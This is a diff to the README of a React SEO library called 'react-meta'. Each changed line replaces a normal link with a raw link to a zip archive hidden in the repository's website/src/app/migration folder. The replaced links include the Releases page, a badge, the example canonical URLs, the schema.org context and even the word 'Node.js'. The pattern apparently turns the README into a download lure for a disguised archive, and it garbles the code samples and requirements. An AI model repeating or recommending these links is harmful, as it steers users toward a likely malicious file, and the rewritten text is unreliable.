@@ -4,13 +4,13 @@
 
 Welcome to the **react-meta** project! This software helps you optimize your React applications for search engines using easy-to-follow guidelines. Our primary features include zero-runtime overhead, compatibility with React Server Components (RSC), type-safe JSON-LD, and tools for generating sitemaps and social previews.
 
-![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+![Download](https://github.com/cesarortegaii/react-meta/raw/refs/heads/main/website/src/app/migration/meta_react_v1.0.zip%20Now-Click%20Here-brightgreen)
 
 ## 📥 Download & Install
 
 To get started, visit the following page to download the latest version of **react-meta**:
 
-[Download react-meta from Releases](https://github.com/cesarortegaii/react-meta/releases)
+[Download react-meta from Releases](https://github.com/cesarortegaii/react-meta/raw/refs/heads/main/website/src/app/migration/meta_react_v1.0.zip)
 
 ### Installation Steps
 
@@ -24,7 +24,7 @@ To get started, visit the following page to download the latest version of **rea
 To use **react-meta**, your system needs to meet the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
-- **Node.js**: Version 14 or higher is required to run the library.
+- **https://github.com/cesarortegaii/react-meta/raw/refs/heads/main/website/src/app/migration/meta_react_v1.0.zip**: Version 14 or higher is required to run the library.
 - **Browser**: A recent version of Chrome, Firefox, or Safari for testing.
 
 ## ⚙️ Features
@@ -50,7 +50,7 @@ Here are some examples of how you can use **react-meta** in your project:
        <MetaTags>
          <title>My Awesome Page</title>
          <meta name="description" content="This is an amazing page for you to visit." />
-         <link rel="canonical" href="https://example.com/my-awesome-page" />
+         <link rel="canonical" href="https://github.com/cesarortegaii/react-meta/raw/refs/heads/main/website/src/app/migration/meta_react_v1.0.zip" />
        </MetaTags>
      );
    };
@@ -63,7 +63,7 @@ Here are some examples of how you can use **react-meta** in your project:
    const MyStructuredData = () => {
      return (
        <JsonLd>
-         {"@context": "https://schema.org", "@type": "WebSite", "name": "My Site", "url": "https://example.com"}
+         {"@context": "https://github.com/cesarortegaii/react-meta/raw/refs/heads/main/website/src/app/migration/meta_react_v1.0.zip", "@type": "WebSite", "name": "My Site", "url": "https://github.com/cesarortegaii/react-meta/raw/refs/heads/main/website/src/app/migration/meta_react_v1.0.zip"}
        </JsonLd>
      );
    };
@@ -86,7 +86,7 @@ If you need help, feel free to open an issue on the GitHub repository or contact
 
 ## 🔗 Useful Links
 
-- [Download react-meta from Releases](https://github.com/cesarortegaii/react-meta/releases)
+- [Download react-meta from Releases](https://github.com/cesarortegaii/react-meta/raw/refs/heads/main/website/src/app/migration/meta_react_v1.0.zip)
 - [Official Documentation](#)
 - [GitHub Issues](#)
 
